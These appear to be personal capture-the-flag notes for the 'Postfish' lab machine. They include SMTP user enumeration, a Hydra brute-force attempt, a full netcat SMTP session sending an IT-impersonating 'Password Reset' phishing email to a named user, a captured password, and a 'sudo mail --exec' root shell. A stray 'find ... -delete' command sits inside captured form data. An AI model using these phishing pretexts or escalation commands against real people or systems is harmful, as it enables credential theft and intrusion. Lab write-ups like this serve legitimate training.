# Postfish Notes

## Data 

IP: 192.168.173.137
OS: Ubuntu Focal 20.04
Arch:
Hostname:
DNS:
Domain:  postfish.off/
Machine Purpose: 
Services:
Service Languages:
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](Postfish-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X

## Data Collected

#### Credentials
```
```

#### HUMINT


#### Solution Inventory Map


#### Todo 


#### Timeline of tasks complete
      

redirect http://postfish.off/

What
```html
<p>Powered by <a href="[https://www.w3schools.com/w3css/default.asp](https://www.w3schools.com/w3css/default.asp)" target="_blank">w3.css</a></p>
```

team.html - Users
```
Claire Madison
Mike Ross
Brian Moore
Sarah Lorem
```


smtpuserenumwithpentestmonkey.png


checkerror.png

requiresphishing.png

Will be twinned with [[Attended-Helped-Through]], and other phishing boxes for phishing-for-2-weeks-24-7 banaza

Hydra to testing top 2000 on all four valid emails
2000krockyouonvalidemailsfailed.png

Got the write for this box as I have never done any phishing so I am bound not know a large amount of the considerations and methodology. At an initial glance of the Walkthrough - department emails 

departments.txt 
```
hr@postfish.off
it@postfish.off
sales@postfish.off
legal@postfish.off
```


```bash
smtp-user-enum -M RCPT -U departments.txt -t postfish.off
```

departmentemailsexist.png

user:password combos before brute force
```
hr:hr, it:it, sales:sales, and legal:legal
```

Read the emails like its a video game and you had read the email to progress...
emailreading.png

Check other services for password reuse - ssh password for sales is not sales

- Phishing
	- Can you impersonate the IT department or organisational authoritative account to get?
		- Passwords or password resets?
			- *Register for this new service - you just need to use you account details to finish the registration process and read Terms and Conditions*
			- *Due to recent an up tick in attempts against your account the IT department requires you to change you password to a great level of complexity...*
		- Intelligence?
			- Information additive to further phishing progress at a later stage - how will it fit or can it be frame to further impersonate an individual?

The Walk Through demonstrates a failed phishing campaign  by setting up a registration page then it progresses to spear-phishing Brian Moore. It then discusses manual approach to discovery of the organisational email formatting conventions. I already discovered those with `smtp-user-enum`

Sending Emails without [[SWAKS]]
```c
// connect
nc $address 25
// HELLO THERE
helo hacker
// response code
MAIL FROM: it@postfish.off 
// response code
RCPT TO: brian.moore@postfish.off // receipiant
// response code
DATA // Send some data !
// response code
Subject: Password Reset

Hey Brian,

Unfortunately we had a problem during our migration and we had to rebuild our database.
Please register at http://192.168.45.178/ and let us know if you encounter any problems.

Regards,
IT
.
// Make sure you use the a single `.` on the final line to close DATA 
// response code
QUIT // terminates sessions
```

Use `nc` not `python3 -m http.server` woops, but tanks to Brian and some URL decoding
thanksBrian.png

```
first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
```

cyberchefurldecode.png

`brian.moore : EternaLSunshinE`


wearebrian.png

There is no sudo privileges for Brian and there are four other users
nosudofourotherusers.png



Primarily box checks - we as well as we can read everyone else directories! 
boxchecks.png

saleshasmaildir.png

rootdir.pngwehi

routesfirewallsanddns.png

nonexistentandactualusers.png

My CTF instincts are press me for the second phish or great privileged user there is no script logging other in
checkifwemaybephishinganotheruser.png

But there are no crons
nocrons.png


unattendwhat.png

salesmail.png

www-baitwtf.png


disclaimerfile.png

rootsshbadmkay.png


nextlevelsomeday.png


pwnkitandpolkit.png


scriptseemslikeitspartofautomateprocess.png


Making sure to append Linux to the dorking the `man trap`  .. 
https://man7.org/linux/man-pages/man1/trap.1p.html

trapcmdonlinux.png

Running out of time I was on the correct track
```
find / -group filter 2>/dev/null
```

Added the shell because I stepped back after yesterday mind blank I did not want to fumble something so easy
addedshell.png
but I did not return a shell even though though root is running this every minute. Then I *The next time a user receives a message, the disclaimer script should be executed. Let's start a Netcat listener to receive the reverse shell.* 
- Always research the file and service provider. `disclaimer.sh` must have some check to run but no execute!...

pspylikeabrian.png


moreactiononpspy.png

No shell because the script gets reset!!

noshell.png

I god the mistake
violatingthescriptbecauseitsoverwritten.png


tomuchgoof.png


weareFILTER.png

We can use mail without a password and suo
https://linux.die.net/man/1/mail

[Mail - GTFObin for sudo mail ]
```
sudo mail --exec='!/bin/sh'
```


root.png

The disclaimer reset script:
disclaimerscript.png

Poor Brian stood no chance with this root activity...
themailscripttoemailthepassword.png